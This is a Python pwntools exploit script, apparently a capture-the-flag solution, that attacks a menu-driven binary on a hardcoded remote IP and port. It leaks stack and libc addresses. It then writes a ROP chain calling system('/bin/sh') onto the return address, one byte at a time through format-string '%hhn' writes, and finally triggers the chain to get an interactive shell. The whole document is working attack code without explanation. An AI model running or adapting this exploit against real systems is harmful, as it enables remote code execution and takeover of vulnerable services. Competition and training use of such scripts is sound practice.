#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.70.212.151 --port 8003 challenge
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.70.212.151'
port = int(args.PORT or 8003)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
br *main+159
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

ra_off = 0x38
libc_off = 0x7f380

def cmd(i):
    io.sendlineafter(b">> ",str(i).encode())

# get libc & stack leaks
cmd(1)
lks = io.recvline().split(b" ")
ra = int(lks[0],16)
log.info(hex(ra))
ra += ra_off
libc = ELF("./libc.so.6")
libc.address = int(lks[1],16) - libc_off
log.info(hex(ra))
log.info(hex(libc.address))
pop_rdi = ROP(libc).find_gadget(["pop rdi","ret"])[0]
rop = [pop_rdi+1,pop_rdi,next(libc.search(b"/bin/sh\0")),libc.sym.system]
rop = b"".join([p64(i) for i in rop])

# writing rop chain byte by byte
def write_byte(addr,b):
    log.info(f"target : 0x{addr:x}")
    if b == 0:
        b = 256
    fmt = f"%{b}c%8$hhn".encode().ljust(16,b"a") + p64(addr)
    assert len(fmt) == 24
    return fmt

for i,b in enumerate(rop):
    log.info(f"{i}")
    pl = write_byte(ra+i,b)
    log.info(pl)
    cmd(2)
    io.sendlineafter(b">> ",pl)

# return -> trigger ropchain
cmd(3)
io.interactive()

